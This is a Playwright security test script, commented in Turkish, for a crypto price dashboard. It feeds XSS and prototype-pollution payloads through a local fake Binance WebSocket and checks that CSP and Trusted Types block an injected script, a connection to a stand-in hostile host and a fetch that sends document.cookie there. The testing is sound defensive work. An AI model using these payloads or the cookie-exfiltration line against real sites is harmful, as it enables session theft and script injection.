// Kartın doğrulama testi: "Yerelde sahte bir WebSocket sunucusu kurup zararlı yük gönderin;
// arayüzün etkilenmediğini ve CSP ihlal raporunu gösterin."
//
// Çalıştırma:  npm run test:security
// Çıktı:       test/evidence/<tarih-saat>/  (ekran görüntüleri, CSP raporları, sonuç tablosu)
import { spawn, execSync } from 'node:child_process';
import { mkdir, writeFile, readFile } from 'node:fs/promises';
import { chromium } from 'playwright';
import { startFakeBinance, ticker } from './fake-binance.mjs';

const PORT = 8788;
const APP = `http://127.0.0.1:${PORT}`;
const stamp = new Date().toLocaleString('sv-SE', { timeZone: 'Europe/Istanbul' }).replace(' ', '_').replaceAll(':', '-');
const OUT = `test/evidence/${stamp}`;
await mkdir(OUT, { recursive: true });
const results = [];
const check = (name, ok, detail = '') => {
  results.push({ name, ok, detail });
  console.log(`${ok ? '✔' : '✘'} ${name}${detail ? ` — ${detail}` : ''}`);
};
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// 1) Test derlemesi: uygulama yalnızca sahte sunucuya bağlanır.
console.log('Test derlemesi hazırlanıyor…');
execSync('npx vite build --outDir dist-test --emptyOutDir', {
  stdio: 'ignore',
  env: { ...process.env, VITE_REST_BASE: 'http://127.0.0.1:9002', VITE_WS_BASE: 'ws://127.0.0.1:9001' },
});
await writeFile('.dev.vars', 'EXTRA_CONNECT_SRC="http://127.0.0.1:9002 ws://127.0.0.1:9001"\n');

// 2) Sahte Binance + Cloudflare Pages yerel sunucusu (aynı _middleware.js başlıklarıyla)
const fake = startFakeBinance();
// Port başka bir süreçte açıksa (eski test kalıntısı) yanlış sunucuyu test etmemek için dur.
try { await fetch(APP); console.error(`Port ${PORT} zaten kullanımda; önceki sunucuyu kapatın.`); process.exit(2); } catch { /* port boş */ }
const wranglerLog = [];
const wr = spawn('npx', ['wrangler', 'pages', 'dev', 'dist-test', '--port', String(PORT), '--ip', '127.0.0.1', '--log-level', 'log'], {
  env: { ...process.env, WRANGLER_SEND_METRICS: 'false', CI: '1' },
  detached: true, // süreç grubunu bütünüyle kapatabilmek için
});
wr.stdout.on('data', (d) => wranglerLog.push(String(d)));
wr.stderr.on('data', (d) => wranglerLog.push(String(d)));
for (let i = 0; i < 60; i++) {
  try { if ((await fetch(APP)).ok) break; } catch { /* bekle */ }
  await sleep(1000);
}

// CHROMIUM_PATH: isteğe bağlı, sistemde kurulu bir Chromium kullanmak için
const browser = await chromium.launch(process.env.CHROMIUM_PATH ? { executablePath: process.env.CHROMIUM_PATH } : {});
const ctx = await browser.newContext({ viewport: { width: 1440, height: 1000 }, locale: 'tr-TR', timezoneId: 'Europe/Istanbul' });
const page = await ctx.newPage();
const dialogs = [];
const consoleLines = [];
page.on('dialog', async (d) => { dialogs.push(d.message()); await d.dismiss(); });
page.on('console', (m) => consoleLines.push(`[${m.type()}] ${m.text()}`));

try {
  // ---------- A. Güvenlik başlıkları ----------
  const res = await fetch(APP);
  const csp = res.headers.get('content-security-policy') || '';
  await writeFile(`${OUT}/01-basliklar.txt`, [...res.headers].map(([k, v]) => `${k}: ${v}`).join('\n'));
  check('CSP başlığı var', !!csp);
  check("CSP'de unsafe-inline / unsafe-eval yok", !/unsafe-(inline|eval)/.test(csp));
  const connect = csp.match(/connect-src ([^;]+)/)?.[1] ?? '';
  check('connect-src joker içermiyor (wss: veya * yok)', !/(^|\s)(wss:|ws:|https:|\*)(\s|$)/.test(connect), connect);
  check('Trusted Types zorunlu', /require-trusted-types-for 'script'/.test(csp));

  // ---------- B. Normal akış ----------
  fake.setDelay(1500);
  await page.goto(APP);
  await sleep(300);
  await page.screenshot({ path: `${OUT}/02-yukleniyor-iskelet.png` });
  fake.setDelay(0);
  await page.waitForSelector('.conn[data-state="ok"]', { timeout: 20000 });
  await page.waitForSelector('.corr-table');
  await sleep(2500);
  await page.screenshot({ path: `${OUT}/03-normal-1440px.png`, fullPage: true });
  check('Canlı bağlantı kuruldu', true);

  // ---------- C. Zararlı WebSocket yükleri ----------
  const before = Number(await page.textContent('#rejected'));
  const payloads = [
    ['XSS: sembol alanında <img onerror>', JSON.stringify(ticker('BTCUSDT', { s: '<img src=x onerror="window.__xss=1;alert(1)">' }))],
    ['XSS: fiyat alanında <script>', JSON.stringify(ticker('BTCUSDT', { c: '<script>window.__xss=1</script>' }))],
    ['XSS: akış adında', JSON.stringify({ ...ticker('BTCUSDT'), stream: '<svg/onload=alert(1)>@ticker' })],
    ['Akış ile sembol uyuşmuyor (sahte ETH akışında BTC)', JSON.stringify({ ...ticker('BTCUSDT'), stream: 'ethusdt@ticker' })],
    ['Bilinmeyen sembol (DOGEUSDT)', JSON.stringify({ stream: 'dogeusdt@ticker', data: { ...ticker('BTCUSDT').data, s: 'DOGEUSDT' } })],
    ['Sayı istismarı: 1e309 (sonsuz)', JSON.stringify(ticker('BTCUSDT', { c: '1e309' }))],
    ['Sayı istismarı: NaN', JSON.stringify(ticker('BTCUSDT', { P: 'NaN' }))],
    ['Negatif fiyat', JSON.stringify(ticker('BTCUSDT', { c: '-1' }))],
    ['Tür karmaşası: fiyat nesne', JSON.stringify(ticker('BTCUSDT', { c: { toString: 'x' } }))],
    ['JSON olmayan ham HTML', '<script>window.__xss=1</script>'],
    ['Aşırı büyük mesaj (20 KB)', JSON.stringify(ticker('BTCUSDT', { pad: 'A'.repeat(20000) }))],
  ];
  for (const [, raw] of payloads) { fake.broadcast(raw); await sleep(120); }
  // Şemaya UYAN ama tehlikeli fazlalık taşıyan mesajlar: fiyat verisi kabul edilir, fazlalık zod tarafından atılır.
  fake.broadcast(JSON.stringify(ticker('BTCUSDT', { html: '<img src=x onerror="window.__xss=1">' })));
  fake.broadcast(`{"stream":"btcusdt@ticker","data":${JSON.stringify(ticker('BTCUSDT').data)},"__proto__":{"polluted":"evet"}}`);
  await sleep(2500);

  const after = Number(await page.textContent('#rejected'));
  const injected = await page.evaluate(() => ({
    xss: window.__xss,
    polluted: ({}).polluted,
    imgs: document.querySelectorAll('img').length,
    inlineScripts: [...document.querySelectorAll('script')].filter((s) => !s.src).length,
    svgOnload: document.querySelectorAll('svg[onload], [onerror]').length,
    bodyHasPayloadText: document.body.innerText.includes('onerror'),
  }));
  check(`Zararlı mesajların tamamı reddedildi (${after - before}/${payloads.length})`, after - before === payloads.length);
  check('Hiçbir script çalışmadı (window.__xss tanımsız)', injected.xss === undefined);
  check('alert penceresi açılmadı', dialogs.length === 0, dialogs.join(' | '));
  check("DOM'a <img>/<script>/olay özniteliği eklenmedi", injected.imgs === 0 && injected.inlineScripts === 0 && injected.svgOnload === 0);
  check('Prototip kirlenmedi', injected.polluted === undefined);
  check('Zararlı metin ekranda görünmüyor', !injected.bodyHasPayloadText);
  await page.locator('.foot').scrollIntoViewIfNeeded();
  await page.screenshot({ path: `${OUT}/04-zararli-yukler-sonrasi.png`, fullPage: true });
  await writeFile(`${OUT}/04-gonderilen-yukler.json`, JSON.stringify(payloads.map(([n, r]) => ({ test: n, yuk: r.slice(0, 300) })), null, 2));

  // ---------- D. Savunmanın ikinci katmanı: CSP + Trusted Types ----------
  // Bir geliştirici ileride hata yapıp innerHTML kullansa veya saldırgan başka bir yoldan kod sokmaya çalışsa ne olur?
  const layer2 = await page.evaluate(async () => {
    const out = { ihlaller: [] };
    document.addEventListener('securitypolicyviolation', (e) => out.ihlaller.push(`${e.effectiveDirective} → ${e.blockedURI}`));
    try { document.querySelector('#banner').innerHTML = '<img src=x onerror="window.__xss=2">'; out.innerHTML = 'ÇALIŞTI'; }
    catch (e) { out.innerHTML = `${e.name}: ${e.message}`; }
    try { const s = document.createElement('script'); s.textContent = 'window.__xss=3'; document.body.append(s); out.inlineScript = window.__xss === 3 ? 'ÇALIŞTI' : 'çalışmadı'; }
    catch (e) { out.inlineScript = `${e.name}: ${e.message}`; }
    try {
      const ws = new WebSocket('wss://kotu-sunucu.example.com/stream');
      out.evilWs = await new Promise((r) => { ws.onopen = () => r('AÇILDI'); ws.onerror = () => r('engellendi (bağlantı kurulamadı)'); setTimeout(() => r('engellendi (zaman aşımı)'), 3000); });
    } catch (e) { out.evilWs = `${e.name}: ${e.message}`; }
    try { await fetch('https://kotu-sunucu.example.com/sizdir?d=' + document.cookie); out.exfil = 'GİTTİ'; }
    catch (e) { out.exfil = `${e.name}: ${e.message}`; }
    try { window.trustedTypes.createPolicy('kotu', { createHTML: (s) => s }); out.newPolicy = 'OLUŞTU'; }
    catch (e) { out.newPolicy = `${e.name}: ${e.message}`; }
    await new Promise((r) => setTimeout(r, 1500));
    out.xss = window.__xss;
    return out;
  });
  await writeFile(`${OUT}/05-ikinci-katman.json`, JSON.stringify(layer2, null, 2));
  check('Trusted Types innerHTML yazımını engelledi', /TypeError/.test(layer2.innerHTML), layer2.innerHTML);
  check('Satır içi script engellendi', layer2.inlineScript !== 'ÇALIŞTI', layer2.inlineScript);
  check('İzinsiz wss adresine bağlantı CSP ile engellendi', layer2.evilWs !== 'AÇILDI' && layer2.ihlaller.some((v) => v.startsWith('connect-src') && v.includes('wss://kotu-sunucu')), layer2.ihlaller.filter((v) => v.startsWith('connect-src')).join(', '));
  check('Veri sızdırma isteği (fetch) engellendi', layer2.exfil !== 'GİTTİ', layer2.exfil);
  check('Yeni Trusted Types politikası oluşturulamadı', layer2.newPolicy !== 'OLUŞTU', layer2.newPolicy);
  check('İkinci katmanda da script çalışmadı', layer2.xss === undefined);

  check(`Tarayıcı ${layer2.ihlaller.length} CSP/Trusted Types ihlali kaydetti`, layer2.ihlaller.length >= 3, layer2.ihlaller.join(' ; '));
  await sleep(3000);
  const reports = wranglerLog.join('').split('\n').filter((l) => l.includes('"csp_violation"'));
  await writeFile(`${OUT}/06-csp-ihlal-raporlari.log`, reports.join('\n') + '\n');
  check(`CSP ihlal raporları sunucuya ulaştı (${reports.length} adet)`, reports.length >= 3);

  // ---------- E. Dayanıklılık: bağlantı kopması ve geri gelmesi ----------
  await fake.stopWs();
  await page.waitForSelector('.conn[data-state="warn"], .conn[data-state="pending"]', { timeout: 30000 });
  await page.locator('.top').screenshot({ path: `${OUT}/07-baglanti-koptu.png` });
  check('Kopma görünür şekilde bildirildi', true, await page.textContent('.conn-text'));
  fake.startWs();
  await page.waitForSelector('.conn[data-state="ok"]', { timeout: 40000 });
  await page.locator('.top').screenshot({ path: `${OUT}/08-yeniden-baglandi.png` });
  check('Otomatik yeniden bağlandı', true);

  // ---------- F. API çökmesi: son başarılı veriyle açılış ----------
  fake.setRestDown(true);
  await fake.stopWs();
  await page.reload();
  await page.waitForSelector('#banner:not([hidden])', { timeout: 20000 });
  await sleep(1000);
  await page.screenshot({ path: `${OUT}/09-api-kapali-son-veri.png`, fullPage: true });
  check('API kapalıyken son başarılı veriyle açıldı', (await page.textContent('#banner')).includes('son başarılı veri'));
  fake.setRestDown(false);
  fake.startWs();

  // ---------- G. Boş sonuç durumu ve mobil ----------
  await page.reload();
  await page.waitForSelector('.conn[data-state="ok"]', { timeout: 20000 });
  await page.fill('#f-search', 'zzz');
  await page.waitForSelector('.empty');
  await page.locator('#detail').screenshot({ path: `${OUT}/10-bos-sonuc.png` });
  check('Boş sonuç durumu gösterildi', true);
  await page.fill('#f-search', '');
  await page.setViewportSize({ width: 360, height: 780 });
  await sleep(1500);
  await page.screenshot({ path: `${OUT}/11-mobil-360px.png`, fullPage: true });
  const overflow = await page.evaluate(() => document.documentElement.scrollWidth > window.innerWidth);
  check('360 px genişlikte yatay taşma yok', !overflow);
} catch (err) {
  check('Test akışı', false, String(err));
  await page.screenshot({ path: `${OUT}/hata.png`, fullPage: true }).catch(() => {});
} finally {
  await writeFile(`${OUT}/konsol.log`, consoleLines.join('\n'));
  await writeFile(`${OUT}/sunucu.log`, wranglerLog.join(''));
  const ok = results.every((r) => r.ok);
  const md = [
    `# Güvenlik doğrulama testi — ${stamp.replace('_', ' ')} (Europe/Istanbul)`,
    '',
    'Sahte WebSocket/REST sunucusu yalnızca 127.0.0.1 üzerinde çalıştı; gerçek Binance\'e test isteği gönderilmedi.',
    '',
    '| # | Kontrol | Sonuç | Ayrıntı |',
    '|---|---|---|---|',
    ...results.map((r, i) => `| ${i + 1} | ${r.name} | ${r.ok ? 'GEÇTİ' : 'KALDI'} | ${String(r.detail).replaceAll('|', '/').slice(0, 160)} |`),
    '',
    `**Genel sonuç: ${ok ? 'TÜM KONTROLLER GEÇTİ' : 'BAŞARISIZ KONTROL VAR'}**`,
  ].join('\n');
  await writeFile(`${OUT}/SONUC.md`, md + '\n');
  await browser.close();
  try { process.kill(-wr.pid, 'SIGTERM'); } catch { wr.kill('SIGTERM'); }
  await fake.close();
  console.log(`\nKanıtlar: ${OUT}/`);
  process.exit(results.every((r) => r.ok) ? 0 : 1);
}
